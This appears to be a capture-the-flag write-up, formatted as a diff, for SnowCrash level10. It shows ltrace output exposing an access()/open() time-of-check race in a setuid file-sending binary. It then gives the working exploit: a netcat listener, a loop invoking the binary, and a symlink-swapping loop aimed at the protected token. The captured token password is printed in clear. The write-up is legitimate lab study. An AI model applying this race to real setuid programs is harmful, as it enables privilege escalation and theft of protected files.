@@ -1,0 +1,70 @@
+1/ level10@SnowCrash:~$ ls -la
+total 28
+dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
+d--x--x--x  1 root    users     340 Aug 30  2015 ..
+-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
+-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
+-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
+-r-x------  1 level10 level10   675 Apr  3  2012 .profile
+-rw-------  1 flag10  flag10     26 Mar  5  2016 token
+
+2/ level10@SnowCrash:~$ ./level10 
+./level10 file host
+	sends file to host if you have access to it
+
+level10@SnowCrash:~$ ./level10 token 
+./level10 file host
+	sends file to host if you have access to it
+
+level10@SnowCrash:~$ ./level10 token localhost
+You don't have access to token
+
+3/ LTRACE ANALYSIS:
+level10@SnowCrash:~$ ./level10 /tmp/test 192.168.56.101
+Connecting to 192.168.56.101:6969 .. Connected!
+Sending file .. wrote file!
+level10@SnowCrash:~$ ltrace ./level10 /tmp/test 192.168.56.101
+__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
+access("/tmp/test", 4)                           = 0
+printf("Connecting to %s:6969 .. ", "192.168.56.101") = 37
+fflush(0xb7fd1a20Connecting to 192.168.56.101:6969 .. )                               = 0
+socket(2, 1, 0)                                  = 3
+inet_addr("192.168.56.101")                      = 0x6538a8c0
+htons(6969, 1, 0, 0, 0)                          = 14619
+connect(3, 0xbffff70c, 16, 0, 0)                 = 0
+write(3, ".*( )*.\n", 8)                         = 8
+printf("Connected!\nSending file .. "Connected!
+)           = 27
+fflush(0xb7fd1a20Sending file .. )                               = 0
+open("/tmp/test", 0, 010)                        = 4
+read(4, "", 4096)                                = 0
+write(3, "", 0)                                  = 0
+puts("wrote file!"wrote file!
+)                              = 12
++++ exited (status 12) +++
+
+4/ We see a syscall to "access" before another syscall to "open" => we can exploit that through a race condition.
+
+3 terminals:
+a) nc -lk 6969
+b) ./trickme
+level10@SnowCrash:~$ cat trickme 
+while true
+do
+        ~/level10 /tmp/trick 127.0.0.1 &> /dev/null
+done;
+c) ./trick
+level10@SnowCrash:~$ cat trick
+while true
+do
+        ln -fs ~/trickme /tmp/trick;
+        ln -fs ~/token /tmp/trick;
+done;
+
+5/ woupa2yuojeeaaed06riuj63c
+level10@SnowCrash:~$ su flag10
+Password: 
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+
+
